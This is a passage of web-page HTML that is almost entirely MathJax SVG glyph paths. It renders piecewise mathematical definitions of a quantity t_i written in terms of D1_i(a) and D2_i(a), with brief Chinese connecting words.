328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6087.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6754.4,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mi" transform="translate(7810.2,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container>时，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="25.056ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 11074.8 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2021.5,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(2854.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(3243.5,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4508.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4897.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5426.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5815.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(6259.7,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7524.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7913.3,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(8442.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8831.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9498.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(10553.8,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g></svg></mjx-container></p><p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="14.653ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 6476.7 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2182.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2849.3,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="msubsup" transform="translate(3905.1,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5169.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5558.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6087.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>时，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="25.009ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 11053.8 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2021.5,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(2854.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(3243.5,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4508.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4897.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5426.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5815.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(6259.7,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7524.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7913.3,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(8442.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 